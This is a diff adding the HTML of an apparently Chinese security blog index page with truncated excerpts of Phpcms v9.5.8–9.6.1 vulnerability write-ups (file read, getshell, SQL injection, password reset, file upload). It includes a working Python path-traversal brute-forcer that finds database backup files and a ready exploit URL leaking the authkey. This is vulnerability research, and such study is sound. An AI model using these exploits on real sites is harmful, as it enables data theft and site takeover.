@@ -1,0 +1,761 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>She11c0de&#39;s blogs</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta property="og:type" content="website">
+<meta property="og:title" content="She11c0de&#39;s blogs">
+<meta property="og:url" content="https://she11c0de.github.io/page/52/index.html">
+<meta property="og:site_name" content="She11c0de&#39;s blogs">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:author" content="She11c0de">
+<meta name="twitter:card" content="summary">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/scrollUp/image.css">
+
+  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <div class="logo">
+        <img src="/logo.png" alt="Profile Picture">
+      </div>
+      <div id="title">She11c0de's blogs</div>
+      
+       <ul class="my-socials">
+  
+ 
+</ul>
+    </div>
+  </div>
+  <div id="header-inner" class="">
+    <nav id="main-nav">
+      <a id="main-nav-toggle" class="nav-icon"></a>
+      <!--
+        
+          
+            <a class="main-nav-link" href="/">首页</a>
+          
+            <a class="main-nav-link" href="/categories/life">生活</a>
+          
+            <a class="main-nav-link" href="/archives">归档</a>
+          
+        
+      -->
+    </nav>
+    <nav id="title-nav" style="display:none">
+      <a href="/">She11c0de&#39;s blogs</a>
+      <img src="/logo.png" alt="Profile Picture">
+      <!--
+      <span id="title-nav-socials">
+        
+       
+     </span>
+      -->
+    </nav>
+    <nav id="sub-nav">
+      
+      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+    </nav>
+    <div id="search-form-wrap">
+      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
+        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
+        <input type="submit" value="" class="search-form-submit">
+        <input name=tn type=hidden value="bds">
+        <input name=cl type=hidden value="3">
+        <input name=ct type=hidden value="2097152">
+        <input type="hidden" name="si" value="she11c0de.github.io">
+      </form>
+    </div>
+  </div>
+  <div class="site-nav" style="display: none;">
+    <ul>
+      
+      
+        <li><a href="/">首页</a></li>
+      
+        <li><a href="/categories/life">生活</a></li>
+      
+        <li><a href="/archives">归档</a></li>
+      
+      
+    </ul>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main">
+  
+
+    
+    <article id="post-Phpcms/Phpcms v9.6.1 任意文件读取" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Phpcms/Phpcms%20v9.6.1%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/" class="article-date">
+  <time datetime="2022-07-08T06:26:01.729Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Phpcms-v9-6-1-任意文件读取"><a href="#Phpcms-v9-6-1-任意文件读取" class="headerlink" title="Phpcms v9.6.1 任意文件读取"></a>Phpcms v9.6.1 任意文件读取</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Phpcms v9.6.1</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>这个版本的 <strong>任意文件读取</strong> 漏洞和上个版本的 <strong>SQL注入</strong><br>漏洞原理是类似的，且出问题的文件均在 <strong>phpcms/modules/content/down.php</strong><br>中。在该文件的 <strong>download</strong> 方法中最后一行调用了 <strong>file_down</strong><br>文件下载函数，我们可以看到其第一个参数是要读取的文件路径。</p>
+<p><img src="/resource/Phpcmsv9.6.1%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/media/rId24.png"></p>
+<p>我们再来看看 <strong>download</strong><br>方法中有哪些限制条件。可以看到其开头部分的代码，和上一个版本的<br><strong>SQL注入</strong> 类似，唯一不同的是这里加解密的 <strong>key</strong> 变成了<br><strong>$pc_auth_key</strong> ，我们等下就要来找找使用 <strong>$pc_auth_key</strong><br>进行加密的可控点。继续看 <strong>download</strong><br>方法，里面对要下载的文件后缀进行了黑名单校验，但是末尾又对 <strong>&gt;&lt;</strong><br>字符进行替换，这就导致后缀名正则可被绕过，例如： **.ph<br>。(下图对应文件位置：phpcms/modules/content/down.php)</p>
+<p><img src="/resource/Phpcmsv9.6.1%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/media/rId25.png"></p>
+<p>现在我们就要来找找使用 <strong>$pc_auth_key</strong> 作为加密 <strong>key</strong><br>的可控点。通过搜索关键字，我们可以看到有三处地方。然而前两处地方是不可以利用的，因为都有登录检测。而第三个点就可以利用，我们看其中<br><strong>$i、$d、$s</strong><br>作为明文字符串被加密。(下图对应文件位置：phpcms/modules/content/down.php)</p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Phpcms/Phpcms%20v9.6.1%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Phpcms/Phpcms%20v9.6.1%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/" data-id="cl5c2qu5t00e1y8v13dfzepec" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Phpcms/Phpcms v9.6.0后台getshell" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Phpcms/Phpcms%20v9.6.0%E5%90%8E%E5%8F%B0getshell/" class="article-date">
+  <time datetime="2022-07-08T06:26:01.726Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Phpcms-v9-6-0后台getshell"><a href="#Phpcms-v9-6-0后台getshell" class="headerlink" title="Phpcms v9.6.0后台getshell"></a>Phpcms v9.6.0后台getshell</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>phpsso_server 后台getshell</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Phpcms v9.6.0</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>漏洞来自于ROOTDIR/phpsso_server/phpcms/modules/admin/system.php</p>
+<pre><code>public function uc() &#123;
+        if (isset($_POST[&#39;dosubmit&#39;])) &#123;
+            $data = isset($_POST[&#39;data&#39;]) ? $_POST[&#39;data&#39;] : &#39;&#39;;
+            $data[&#39;ucuse&#39;] = isset($_POST[&#39;ucuse&#39;]) &amp;&amp; intval($_POST[&#39;ucuse&#39;]) ? intval($_POST[&#39;ucuse&#39;]) : 0;
+            $filepath = CACHE_PATH.&#39;configs&#39;.DIRECTORY_SEPARATOR.&#39;system.php&#39;;
+            $config = include $filepath;
+            $uc_config = &#39;&lt;?php &#39;.&quot;\ndefine(&#39;UC_CONNECT&#39;, &#39;mysql&#39;);\n&quot;;
+            foreach ($data as $k =&gt; $v) &#123;
+                $old[] = &quot;&#39;$k&#39;=&gt;&#39;&quot;.(isset($config[$k]) ? $config[$k] : $v).&quot;&#39;,&quot;;
+                $new[] = &quot;&#39;$k&#39;=&gt;&#39;$v&#39;,&quot;;
+                $uc_config .= &quot;define(&#39;&quot;.strtoupper($k).&quot;&#39;, &#39;$v&#39;);\n&quot;;
+            &#125;
+            $html = file_get_contents($filepath);
+            $html = str_replace($old, $new, $html);
+            $uc_config_filepath = CACHE_PATH.&#39;configs&#39;.DIRECTORY_SEPARATOR.&#39;uc_config.php&#39;;
+            @file_put_contents($uc_config_filepath, $uc_config);
+            @file_put_contents($filepath, $html);
+            $this-&gt;db-&gt;insert(array(&#39;name&#39;=&gt;&#39;ucenter&#39;, &#39;data&#39;=&gt;array2string($data)), 1,1);
+            showmessage(L(&#39;operation_success&#39;), HTTP_REFERER);
+        &#125;
+        $data = array();
+        $r = $this-&gt;db-&gt;get_one(array(&#39;name&#39;=&gt;&#39;ucenter&#39;));
+        if ($r) &#123;
+            $data = string2array($r[&#39;data&#39;]);
+        &#125;
+        include $this-&gt;admin_tpl(&#39;system_uc&#39;);
+    &#125;
+</code></pre>
+<p>来自这段中的</p>
+<p>$data = isset($_POST[&#39;data&#39;]) ? $_POST[&#39;data&#39;] : &#39;&#39;;</p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Phpcms/Phpcms%20v9.6.0%E5%90%8E%E5%8F%B0getshell/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Phpcms/Phpcms%20v9.6.0%E5%90%8E%E5%8F%B0getshell/" data-id="cl5c2qu5s00dzy8v13m8c4j8y" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Phpcms/Phpcms V9.6.0 数据库备份爆破" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Phpcms/Phpcms%20V9.6.0%20%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%87%E4%BB%BD%E7%88%86%E7%A0%B4/" class="article-date">
+  <time datetime="2022-07-08T06:26:01.723Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Phpcms-V9-6-0-数据库备份爆破"><a href="#Phpcms-V9-6-0-数据库备份爆破" class="headerlink" title="Phpcms V9.6.0 数据库备份爆破"></a>Phpcms V9.6.0 数据库备份爆破</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Phpcms V9.6.0</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><pre><code>#!/usr/bin/env python
+# coding=utf-8
+&#39;&#39;&#39;/*
+    * author = Mochazz
+    * team   = 红日安全团队
+    * env    = pyton3
+    *
+    */
+&#39;&#39;&#39;
+import requests
+import itertools
+characters = &quot;abcdefghjklmnopqrstuvwxyz0123456789_!#&quot;
+backup_sql = &quot;&quot;
+payload = &quot;/api.php?op=creatimg&amp;txt=mochazz&amp;font=/../../../../caches/bakup/default/&#123;location&#125;&lt;&lt;&quot;
+url = &quot;http://www.0-sec.org&quot;
+flag = 0
+for num in range(1, 7):
+    if flag:
+        break
+    for pre in itertools.permutations(characters, num):
+        pre = &#39;&#39;.join(list(pre))
+        payload = payload.format(location=pre)
+        r = requests.get(url+payload)
+        if r.status_code == 200 and &quot;PNG&quot; in r.text:
+            flag = 1
+            backup_sql = pre
+            payload = &quot;/api.php?op=creatimg&amp;txt=mochazz&amp;font=/../../../../caches/bakup/default/&#123;location&#125;&lt;&lt;&quot;
+            break
+        else:
+            payload = &quot;/api.php?op=creatimg&amp;txt=mochazz&amp;font=/../../../../caches/bakup/default/&#123;location&#125;&lt;&lt;&quot;
+print(&quot;[+] 前缀为：&quot;, backup_sql)
+flag = 0
+for i in range(30):
+    if flag:
+        break
+    for ch in characters:
+        if ch == characters[-1]:
+            flag = 1
+            break
+        payload = payload.format(location=backup_sql+ch)
+        r = requests.get(url + payload)
+        if r.status_code == 200 and &quot;PNG&quot; in r.text:
+            backup_sql += ch
+            print(&quot;[+] &quot;, backup_sql)
+            payload = &quot;/api.php?op=creatimg&amp;txt=mochazz&amp;font=/../../../../caches/bakup/default/&#123;location&#125;&lt;&lt;&quot;
+            break
+        else:
+            payload = &quot;/api.php?op=creatimg&amp;txt=mochazz&amp;font=/../../../../caches/bakup/default/&#123;location&#125;&lt;&lt;&quot;
+
+print(&quot;备份sql文件地址为：&quot;, backup_sql+&quot;.sql&quot;)
+</code></pre>
+<p>结果为：</p>
+<pre><code>C:\Users\dell\Desktop&gt;python Zxc.py
+[+] 前缀为： 1
+[+]  12
+[+]  123
+[+]  1231
+[+]  12312
+[+]  123123
+[+]  1231231
+[+]  12312312
+[+]  123123123
+备份sql文件地址为： 123123123.sql
+</code></pre>
+
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Phpcms/Phpcms%20V9.6.0%20%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%87%E4%BB%BD%E7%88%86%E7%A0%B4/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Phpcms/Phpcms%20V9.6.0%20%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%87%E4%BB%BD%E7%88%86%E7%A0%B4/" data-id="cl5c2qu5s00dyy8v1ar7599sr" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Phpcms/Phpcms v9.6.0 任意文件上传" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Phpcms/Phpcms%20v9.6.0%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" class="article-date">
+  <time datetime="2022-07-08T06:26:01.721Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Phpcms-v9-6-0-任意文件上传"><a href="#Phpcms-v9-6-0-任意文件上传" class="headerlink" title="Phpcms v9.6.0 任意文件上传"></a>Phpcms v9.6.0 任意文件上传</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Phpcms v9.6.0</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>这个漏洞存在于用户注册处。这里有一个可控变量 <strong>$_POST[&#39;info&#39;]</strong><br>传入了 <strong>member_input</strong> 类的 <strong>get</strong><br>方法中，跟进该方法。(下图对应文件位置：phpcms/modules/member/index.php)</p>
+<p><img src="/resource/Phpcmsv9.6.0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/media/rId24.png"></p>
+<p>在 <strong>get</strong> 方法中，我们发现 <strong>$data</strong> 变量来自 <strong>$_POST[&#39;info&#39;]</strong><br>，并且我们可以调用 <strong>member_input</strong> 类的所有方法（对应下图<br><strong>第47-48行</strong><br>代码）。(下图对应文件位置：caches/caches_model/caches_data/member_input.class.php)</p>
+<p><img src="/resource/Phpcmsv9.6.0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/media/rId25.png"></p>
+<p>看了一下 <strong>member_input</strong> 类的所有方法，只有一个 <strong>editor</strong><br>方法比较好利用，而本次漏洞正是利用到这个方法。在这个方法中，调用了<br><strong>attachment</strong> 类的 <strong>download</strong><br>方法。(下图对应文件位置：caches/caches_model/caches_data/member_input.class.php)</p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Phpcms/Phpcms%20v9.6.0%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Phpcms/Phpcms%20v9.6.0%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" data-id="cl5c2qu5t00e0y8v10i9h7f5f" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Phpcms/Phpcms V9.6.0 任意密码重置漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Phpcms/Phpcms%20V9.6.0%20%E4%BB%BB%E6%84%8F%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:26:01.719Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Phpcms-V9-6-0-任意密码重置漏洞"><a href="#Phpcms-V9-6-0-任意密码重置漏洞" class="headerlink" title="Phpcms V9.6.0 任意密码重置漏洞"></a>Phpcms V9.6.0 任意密码重置漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Phpcms V9.6.0</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p><code>/phpcms/modules/member/index.php</code> 第267到312行</p>
+<pre><code>public function send_newmail() &#123;
+    $_username = param::get_cookie(&#39;_regusername&#39;);
+    $_userid = param::get_cookie(&#39;_reguserid&#39;);
+    $_ssouid = param::get_cookie(&#39;_reguseruid&#39;);
+    $newemail = $_GET[&#39;newemail&#39;];
+ 
+    if($newemail==&#39;&#39;)&#123;//邮箱为空，直接返回错误
+        return &#39;2&#39;;
+    &#125;
+    $this-&gt;_init_phpsso();
+    $status = $this-&gt;client-&gt;ps_checkemail($newemail);
+    if($status==&#39;-5&#39;)&#123;//邮箱被占用
+        exit(&#39;-1&#39;);
+    &#125;
+    if ($status==-1) &#123;
+        $status = $this-&gt;client-&gt;ps_get_member_info($newemail, 3);
+        if($status) &#123;
+            $status = unserialize($status); //接口返回序列化，进行判断
+            if (!isset($status[&#39;uid&#39;]) || $status[&#39;uid&#39;] != intval($_ssouid)) &#123;
+                exit(&#39;-1&#39;);
+            &#125;
+        &#125; else &#123;
+            exit(&#39;-1&#39;);
+        &#125;
+    &#125;
+    //验证邮箱格式
+    pc_base::load_sys_func(&#39;mail&#39;);
+    $code = sys_auth($_userid.&#39;|&#39;.microtime(true), &#39;ENCODE&#39;, get_auth_key(&#39;email&#39;));
+    $url = APP_PATH.&quot;index.php?m=member&amp;c=index&amp;a=register&amp;code=$code&amp;verify=1&quot;;
+ 
+    //读取配置获取验证信息
+    $member_setting = getcache(&#39;member_setting&#39;);
+    $message = $member_setting[&#39;registerverifymessage&#39;];
+    $message = str_replace(array(&#39;&#123;click&#125;&#39;,&#39;&#123;url&#125;&#39;,&#39;&#123;username&#125;&#39;,&#39;&#123;email&#125;&#39;,&#39;&#123;password&#125;&#39;), array(&#39;&lt;a href=&quot;&#39;.$url.&#39;&quot;&gt;&#39;.L(&#39;please_click&#39;).&#39;&lt;/a&gt;&#39;,$url,$_username,$newemail,$password), $message);
+ 
+    if(sendmail($newemail, L(&#39;reg_verify_email&#39;), $message))&#123;
+        //更新新的邮箱，用来验证
+        $this-&gt;db-&gt;update(array(&#39;email&#39;=&gt;$newemail), array(&#39;userid&#39;=&gt;$_userid));
+        $this-&gt;client-&gt;ps_member_edit($_username, $newemail, &#39;&#39;, &#39;&#39;, $_ssouid);
+        $return = &#39;1&#39;;
+    &#125;else&#123;
+        $return = &#39;2&#39;;
+    &#125;
+    echo $return;
+&#125;
+</code></pre>
+<p>　　<code>$_userid</code>用 <code>param::get_cookie(&#39;_reguserid&#39;)</code> 来获取</p>
+<p>跟进去：<code>/phpv9.6.0/phpcms/libs/classes/param.class.php</code> 第106-117行。</p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Phpcms/Phpcms%20V9.6.0%20%E4%BB%BB%E6%84%8F%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Phpcms/Phpcms%20V9.6.0%20%E4%BB%BB%E6%84%8F%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qu5r00dxy8v13ck074dy" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Phpcms/Phpcms v9.6.0 sql注入" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Phpcms/Phpcms%20v9.6.0%20sql%E6%B3%A8%E5%85%A5/" class="article-date">
+  <time datetime="2022-07-08T06:26:01.717Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Phpcms-v9-6-0-sql注入"><a href="#Phpcms-v9-6-0-sql注入" class="headerlink" title="Phpcms v9.6.0 sql注入"></a>Phpcms v9.6.0 sql注入</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Phpcms v9.6.0</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>这个版本的 <strong>SQL注入</strong><br>主要在于程序对解密后的数据没有进行过滤，我们来看一下漏洞文件<br><strong>phpcms/modules/content/down.php</strong> 。在其 <strong>init</strong> 方法中，从 <strong>GET</strong><br>数据中获取了 <strong>a_k</strong><br>的值，该值若能解密成程序规定格式的字符串，则程序继续运行（这里加解密使用的秘钥必须一致，例如这里秘钥为<br><strong>pc_base::load_config(&#39;system&#39;,&#39;auth_key&#39;)</strong><br>）。程序将解密后的数据用 <strong>parse_str</strong><br>函数处理，这里又存在变量覆盖问题。然后将可控变量 <strong>$id</strong><br>带入数据库查询，我们跟进 <strong>get_one</strong> 方法。</p>
+<p><img src="/resource/Phpcmsv9.6.0sql%E6%B3%A8%E5%85%A5/media/rId24.png"></p>
+<p><strong>get_one</strong> 方法调用了 <strong>sqls</strong> 方法，而在 <strong>sqls</strong><br>方法中可以明显看到，未过滤的数据直接拼接进了 <strong>SQL</strong> 语句中。</p>
+<p><img src="/resource/Phpcmsv9.6.0sql%E6%B3%A8%E5%85%A5/media/rId25.png"></p>
+<p>那么现在，我们要解决的问题是：如何构造出加密数据，使得数据能够被正常解密？我们先来看一下<br><strong>sys_auth</strong> 函数的代码，其代码位于<br><strong>phpcms/libs/functions/global.func.php</strong><br>中。开头我们可以很明显看到，当我们没有指定加解密用的 <strong>key</strong><br>时，系统默认使用 <strong>pc_base::load_config(&#39;system&#39;,&#39;auth_key&#39;)</strong><br>作为 <strong>key</strong> ，这样我们就不用特地去搜索形如<br><strong>sys_auth(&#39;xxx&#39;,&#39;ENCODE&#39;,pc_base::load_config(&#39;system&#39;,&#39;auth_key&#39;))</strong><br>的代码段，直接搜索形如 <strong>sys_auth(&#39;可控字符串&#39;,&#39;ENCODE&#39;)</strong> 或<br><strong>sys_auth(&#39;可控字符串&#39;)</strong><br>的代码段即可。（这里搜索这种代码段的目的，是为了找到可利用的点将恶意<br><strong>payload</strong> 进行加密，然后传输给开头 <strong>phpcms/modules/content/down.php</strong><br>文件的 <strong>init</strong> 方法进一步利用）</p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Phpcms/Phpcms%20v9.6.0%20sql%E6%B3%A8%E5%85%A5/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Phpcms/Phpcms%20v9.6.0%20sql%E6%B3%A8%E5%85%A5/" data-id="cl5c2qu5q00dwy8v17p1ohz4i" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Phpcms/Phpcms V9.6.0 authkey泄露导致注入" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Phpcms/Phpcms%20V9.6.0%20authkey%E6%B3%84%E9%9C%B2%E5%AF%BC%E8%87%B4%E6%B3%A8%E5%85%A5/" class="article-date">
+  <time datetime="2022-07-08T06:26:01.714Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Phpcms-V9-6-0-authkey泄露导致注入"><a href="#Phpcms-V9-6-0-authkey泄露导致注入" class="headerlink" title="Phpcms V9.6.0 authkey泄露导致注入"></a>Phpcms V9.6.0 authkey泄露导致注入</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Phpcms V9.6.0</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><pre><code>http://www.0-sec.org/api.php?op=get_menu&amp;act=ajax_getlist&amp;callback=aaaaa&amp;parentid=0&amp;key=authkey&amp;cachefile=..\..\..\phpsso_server\caches\caches_admin\caches_data\applist&amp;path=admin
+</code></pre>
+
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Phpcms/Phpcms%20V9.6.0%20authkey%E6%B3%84%E9%9C%B2%E5%AF%BC%E8%87%B4%E6%B3%A8%E5%85%A5/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Phpcms/Phpcms%20V9.6.0%20authkey%E6%B3%84%E9%9C%B2%E5%AF%BC%E8%87%B4%E6%B3%A8%E5%85%A5/" data-id="cl5c2qu5k00duy8v196nl65wk" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Phpcms/Phpcms V9.5.8 后台getshell" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Phpcms/Phpcms%20V9.5.8%20%E5%90%8E%E5%8F%B0getshell/" class="article-date">
+  <time datetime="2022-07-08T06:26:01.711Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Phpcms-V9-5-8-后台getshell"><a href="#Phpcms-V9-5-8-后台getshell" class="headerlink" title="Phpcms V9.5.8 后台getshell"></a>Phpcms V9.5.8 后台getshell</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Phpcms V9.5.8</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>代码位于<code>/phpcms/modules/content/content.php</code> 第472-532行</p>
+<pre><code>public function public_categorys() &#123;
+    $show_header = &#39;&#39;;
+    $cfg = getcache(&#39;common&#39;,&#39;commons&#39;);
+    $ajax_show = intval($cfg[&#39;category_ajax&#39;]);
+    $from = isset($_GET[&#39;from&#39;]) &amp;&amp; in_array($_GET[&#39;from&#39;],array(&#39;block&#39;)) ? $_GET[&#39;from&#39;] : &#39;content&#39;;
+    $tree = pc_base::load_sys_class(&#39;tree&#39;);
+    if($from==&#39;content&#39; &amp;&amp; $_SESSION[&#39;roleid&#39;] != 1) &#123; 
+        $this-&gt;priv_db = pc_base::load_model(&#39;category_priv_model&#39;);
+        $priv_result = $this-&gt;priv_db-&gt;select(array(&#39;action&#39;=&gt;&#39;init&#39;,&#39;roleid&#39;=&gt;$_SESSION[&#39;roleid&#39;],&#39;siteid&#39;=&gt;$this-&gt;siteid,&#39;is_admin&#39;=&gt;1));
+        $priv_catids = array();
+        foreach($priv_result as $_v) &#123;
+            $priv_catids[] = $_v[&#39;catid&#39;];
+        &#125;
+        if(empty($priv_catids)) return &#39;&#39;;
+    &#125;
+    $categorys = array();
+    if(!empty($this-&gt;categorys)) &#123;
+        foreach($this-&gt;categorys as $r) &#123;
